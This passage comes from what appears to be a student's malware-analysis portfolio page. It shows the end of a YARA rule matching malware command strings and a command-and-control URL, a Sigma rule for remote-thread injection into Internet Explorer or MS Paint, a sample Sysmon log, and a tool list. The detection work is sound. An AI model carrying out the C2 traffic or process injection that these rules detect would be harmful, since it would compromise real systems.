        $cmd3 = "$launchddosfc25"
        $url1 = "vcs.gtisc.gatech.edu/server/operate.php"
    condition:
        2 of ($cmd*) or $url1
}
</code></pre>
                <h3>Sigma (Sysmon Process Injection Heuristics)</h3>
                <pre><code>title: Suspicious Remote Thread Creation into IE/MSPaint
logsource:
  product: windows
  service: sysmon
  definition: 'EventID 8 CreateRemoteThread'
detection:
  selection:
    TargetImage|endswith:
      - '\\iexplore.exe'
      - '\\mspaint.exe'
  condition: selection
level: medium
</code></pre>
                <h3>Validation (Example Sysmon Log)</h3>
                <pre><code>{
  "EventID": 8,
  "Image": "C:\\Windows\\System32\\rundll32.exe",
  "TargetImage": "C:\\Program Files\\Internet Explorer\\iexplore.exe"
}
// Expected: Sigma rule above matches (level=medium)
</code></pre>
                <figure class="diagram">
                  <pre class="mermaid">
flowchart LR
  Logs[Sample Sysmon Events] --> Sigma[Sigma Rule]
  Sigma --> Match[Expected Match]
  Match --> Action[Alert / Hunt Query]
                  </pre>
                  <figcaption>Detection validation flow.</figcaption>
                </figure>
            </div>
            <div class="project-artifacts">
                <h2>Artifacts &amp; References</h2>
                <ul>
                    <li><strong>Tools:</strong> <a href="https://ghidra-sre.org/" target="_blank" rel="noopener">Ghidra</a>, <a href="https://hex-rays.com/ida-pro/" target="_blank" rel="noopener">IDA Pro</a>, <a href="https://rada.re/n/" target="_blank" rel="noopener">radare2</a>, <a href="https://angr.io/" target="_blank" rel="noopener">angr</a>, <a href="https://github.com/skylot/jadx" target="_blank" rel="noopener">Jadx</a>, <a href="https://ibotpeaches.github.io/Apktool/" target="_blank" rel="noopener">ApkTool</a>, <a href="https://cuckoosandbox.org/" target="_blank" rel="noopener">Cuckoo Sandbox</a>, <a href="https://www.joesecurity.org/" target="_blank" rel="noopener">Joe&nbsp;Sandbox</a>, <a href="https://github.com/rieck/malheur" target="_blank" rel="noopener">Malheur</a>, <a href="https://yara.readthedocs.io/" target="_blank" rel="noopener">YARA</a>, <a href="https://github.com/SigmaHQ/sigma" target="_blank" rel="noopener">Sigma</a></li>
                    <li><strong>Repo structure (planned):</strong> <code>detections/</code> (YARA, Sigma), <code>scripts/</code> (DNAT rules, <code>linux_sym_exec.py</code> harness), <code>notebooks/</code> (Malheur experiments), <code>c2-emulator/</code> (mock endpoints), <code>docs/</code> (one-pager, slides).</li>
                    <li><strong>Images:</strong> Analysis environment/process diagrams included; additional artifacts available upon request for academic review.</li>
                    <li><strong>Data availability:</strong> Binaries and hashes withheld to prevent misuse. Reproduction feasible with institution‑approved samples following the procedures outlined.</li>
                    <li><strong>Project Links (to be published):</strong> <a href="#" target="_blank" rel="noopener">GitHub: detections/</a>, <a href="#" target="_blank" rel="noopener">scripts/</a>, <a href="#" target="_blank" rel="noopener">notebooks/</a>, <a href="#" target="_blank" rel="noopener">c2-emulator/</a>.</li>
                </ul>
            </div>

            <p><a href="../index.html#projects">Back to Projects</a> | <a href="#cs6035-malware-analysis">CS6035 Research Extension</a></p>
        </section>
    </main>

    <footer class="footer">
        <div class="container">
            <p>&copy; 2025 Mason Kim. All rights reserved.</p>
        </div>
    </footer>
    <script src="https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js" defer></script>
    <script defer>
      document.addEventListener('DOMContentLoaded', function () {
        if (window.mermaid) {
          mermaid.initialize({ startOnLoad: true, theme: 'dark' });
        }
      });
    </script>
    <script defer>
      document.addEventListener('DOMContentLoaded', function () {
        const setText = (id, value) => {
          const el = document.getElementById(id);
          if (el && value != null && value !== '') {
            el.textContent = String(value);
          }
        };
        const pct = (v) => (typeof v === 'number' ? (v * 100).toFixed(1) + '%' : null);
        fetch('../assets/metrics/malware-analysis.json')
          .then(r => r.ok ? r.json() : Promise.reject())
          .then(m => {
            try {
              setText('metric-commands-recovered', m.commandsRecovered);
              if (Array.isArray(m.activatedBehaviors)) {
                setText('metric-activated-behaviors', m.activatedBehaviors.join(', '));
              }
              if (m.staticCoverage) setText('metric-static-coverage', m.staticCoverage);
              const de = m.detectionEvaluation || {};
              let tpr = de.tpr;
              let fpr = de.fpr;
              const num = (x) => typeof x === 'number' && !isNaN(x);
              if ((tpr == null) && num(de.tp) && num(de.fn) && (de.tp + de.fn) > 0) {
                tpr = de.tp / (de.tp + de.fn);
              }
              if ((fpr == null) && num(de.fp) && num(de.tn) && (de.fp + de.tn) > 0) {
                fpr = de.fp / (de.fp + de.tn);
              }
              if (tpr != null) setText('metric-detection-tpr', pct(tpr));
              if (fpr != null) setText('metric-detection-fpr', pct(fpr));
              if (m.ml && m.ml.f1 != null) {
                setText('metric-ml-f1', (typeof m.ml.f1 === 'number') ? m.ml.f1.toFixed(2) : m.ml.f1);
              }
              if (m.ml && m.ml.rejectedSubjects != null) {
                setText('metric-ml-rejected', m.ml.rejectedSubjects);
              }
            } catch (e) { /* no-op */ }
          })
          .catch(() => {/* metrics optional */});
      });
    </script>
</body>
</html>
